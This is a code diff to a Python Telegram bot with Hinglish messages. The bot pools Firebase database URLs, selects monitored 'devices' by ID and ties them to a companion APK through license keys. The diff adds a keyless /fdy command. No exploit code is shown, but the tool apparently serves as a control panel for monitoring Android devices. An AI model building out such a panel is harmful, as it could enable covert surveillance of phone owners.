@@ -57,6 +57,7 @@ from app.services import (
     connect_firebase_url,
     set_channel_id,
     set_license_key,
+    require_license_key,
     show_device_by_id,
     set_user_phone,
     start_monitoring,
@@ -435,7 +436,8 @@ async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         "mydevice|https://app3-default-rtdb.firebaseio.com\n"
         "deviceid,https://app4-default-rtdb.firebaseio.com"
         "</pre>\n"
-        "Import ke baad: <code>/a &lt;device_id&gt;</code>\n\n"
+        "Import ke baad: <code>/fdy &lt;device_id&gt;</code> (bina key)\n"
+        "Key ke saath: <code>/a &lt;device_id&gt;</code>\n\n"
         "Ek URL ke liye: <code>/setfirebase &lt;url&gt;</code>",
         parse_mode="HTML",
     )
@@ -500,7 +502,8 @@ async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFA
         f"Failed: {result['failed']}\n"
         f"Pool total: {result['pool_total']}"
         "</pre>\n"
-        "Device pick: <code>/a &lt;device_id&gt;</code>\n"
+        "Device pick: <code>/fdy &lt;device_id&gt;</code>\n"
+        "Key wala pick: <code>/a &lt;device_id&gt;</code>\n"
         "License key: <code>/key generate</code>",
         parse_mode="HTML",
     )
@@ -551,8 +554,13 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 
-async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Shared handler for /a /setdevice /fy /fb <device_id>"""
+async def device_select_command(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE,
+    *,
+    bind_license_key: bool = False,
+) -> None:
+    """Find device from pool — /fdy /fy /fb /setdevice."""
     user = update.effective_user
     if not is_authorized(user.id if user else None):
         return
@@ -562,7 +570,8 @@ async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TY
         await update.message.reply_text(
             f"Usage: `{cmd} <device_id>`\n\n"
             "Example:\n"
-            f"`{cmd} cac2ced675392f6c`",
+            f"`{cmd} c7109e69317cd5de`\n\n"
+            "Key ke saath: `/a <device_id>`",
             parse_mode="Markdown",
         )
         return
@@ -570,12 +579,28 @@ async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TY
     deviceid = context.args[0]
     db: Session = SessionLocal()
     try:
-        device, profile = await show_device_by_id(db, deviceid, user.id)
-    except LookupError:
+        device, profile = await show_device_by_id(
+            db,
+            deviceid,
+            user.id,
+            bind_license_key=bind_license_key,
+        )
+    except LookupError as exc:
+        message = str(exc)
+        if message.startswith("multiple:"):
+            options = message.removeprefix("multiple:").split("|")
+            lines = [f"🔎 <b>{len(options)}+ matches</b> for <code>{deviceid}</code>\n"]
+            for option in options:
+                name, _fb = (option.split(":", 1) + ["-"])[:2]
+                lines.append(f"• <code>{name}</code>")
+            await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+            return
+        total = db.query(Device).count()
         await update.message.reply_text(
-            f"❌ Device `{deviceid}` nahi mili.\n"
-            f"Pehle `/setfirebase` ya `/allfirebase` use karo.",
-            parse_mode="Markdown",
+            f"❌ Device <code>{deviceid}</code> nahi mili.\n"
+            f"DB total: <b>{total}</b>\n\n"
+            f"Try: <code>/fdy {deviceid}</code>",
+            parse_mode="HTML",
         )
         return
     except Exception as exc:
@@ -587,6 +612,10 @@ async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TY
 
     await sync_profile_to_firebase(profile, device)
     await send_device_set_ui(update.message, device, profile)
+
+
+async def fdy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    await device_select_command(update, context, bind_license_key=False)
 
 
 async def send_device_set_ui(message, device: Device, profile: MonitorProfile | None = None) -> None:
@@ -613,8 +642,25 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 return
         finally:
             db.close()
+        await update.message.reply_text(
+            "Usage: `/a <device_id>`\n\n"
+            "⚠️ `/a` ke liye pehle `/key` set karo (bot + APK same key).\n"
+            "Bina key: `/fdy <device_id>`",
+            parse_mode="Markdown",
+        )
+        return
 
-    await device_select_command(update, context)
+    db: Session = SessionLocal()
+    try:
+        profile = get_monitor_profile(db, user.id)
+        require_license_key(profile)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}\n\nBina key use karo: `/fdy {context.args[0]}`", parse_mode="Markdown")
+        return
+    finally:
+        db.close()
+
+    await device_select_command(update, context, bind_license_key=True)
 
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1185,10 +1231,11 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("revoke", revoke_command))
     app.add_handler(CommandHandler("users", users_command))
     app.add_handler(CommandHandler("key", key_command))
-    app.add_handler(CommandHandler("fy", device_select_command))
-    app.add_handler(CommandHandler("fb", device_select_command))
+    app.add_handler(CommandHandler("fdy", fdy_command))
+    app.add_handler(CommandHandler("fy", fdy_command))
+    app.add_handler(CommandHandler("fb", fdy_command))
     app.add_handler(CommandHandler("a", a_command))
-    app.add_handler(CommandHandler("setdevice", device_select_command))
+    app.add_handler(CommandHandler("setdevice", fdy_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
     app.add_handler(CommandHandler("adddevice", adddevice_command))
